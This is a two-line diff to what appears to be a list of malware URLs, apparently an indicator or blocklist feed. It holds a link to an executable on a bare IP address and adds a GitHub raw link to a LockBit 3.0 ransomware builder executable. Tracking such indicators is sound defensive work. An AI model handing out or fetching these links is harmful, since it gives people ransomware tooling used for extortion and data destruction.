@@ -1,1 +1,2 @@
 http://119.28.78.133/LB3.exe
+https://raw.githubusercontent.com/petikvx/LockBit-Black-Builder/main/LockBit30/builder.exe
